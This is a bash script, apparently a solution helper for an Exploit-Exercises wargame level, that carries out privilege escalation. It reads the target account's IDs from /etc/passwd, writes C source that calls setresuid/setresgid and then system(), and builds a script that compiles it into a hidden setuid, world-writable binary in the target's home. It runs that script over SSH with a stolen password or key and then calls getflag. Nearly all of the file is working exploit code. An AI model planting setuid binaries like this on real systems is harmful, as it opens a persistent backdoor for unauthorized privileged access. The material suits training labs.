#!/bin/bash -eu
# Copyright (c) 2015, Heye Voecking <heye.voecking+exploit-exercises.com@gmail.com>

source $HOME/common/utils

# Init target vars
SUCCESS=59
TARGET=$(whoami | sed 's/level/flag/')
PASSWD=$(grep "^${TARGET}:" /etc/passwd)
IFS=':' read -a ARRAY <<< "$PASSWD"
TARGET_UID=${ARRAY[2]}
TARGET_GID=${ARRAY[3]}
TARGET_HOME=${ARRAY[5]}

# We're planting a script (which is to be filled in the prepare_flag function)
# which will compile a setuid binary for privilige escalation
EXPLOIT_SCRIPT=$(mktemp --suffix=.sh)
registerTrap "rm $EXPLOIT_SCRIPT" EXIT
chmod +rx $EXPLOIT_SCRIPT

# Write source and compile-script to exploit the found RCE vulnerability
EXPLOIT_BIN=$TARGET_HOME/.$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)

EXPLOIT_SRC=$(mktemp --suffix=.c)
registerTrap "rm $EXPLOIT_SRC" EXIT
chmod +r $EXPLOIT_SRC

exploit_with_binary() {
  $EXPLOIT_BIN $TARGET_UID $TARGET_GID $(which getflag)
}

exploit_with_token() {
  local SSH_PASS=$1; shift
  socat_exec $SSH_PASS "ssh $SOCAT_SSH_OPTIONS $TARGET@localhost '$EXPLOIT_SCRIPT'" >/dev/null
  exploit_with_binary
}

exploit_with_identity() {
  local ID_RSA=$1; shift
  ssh $SSH_OPTIONS -i $ID_RSA $TARGET@localhost "$EXPLOIT_SCRIPT"
  exploit_with_binary
}

cat <<EOF > $EXPLOIT_SRC
#include <sys/types.h>

int main(int argc, char **argv, char **envp)
{
  uid_t uid = atoi(argv[1]);
  gid_t gid = atoi(argv[2]);
  setresuid(uid, uid, uid);
  setresgid(gid, gid, gid);

  system(argv[3]);
  system("/bin/rm $EXPLOIT_BIN");
}
EOF

cat <<EOF > $EXPLOIT_SCRIPT
#!/bin/bash -eu

PATH=$PATH
gcc $EXPLOIT_SRC -o $EXPLOIT_BIN
chmod +s,a+rwx $EXPLOIT_BIN
EOF
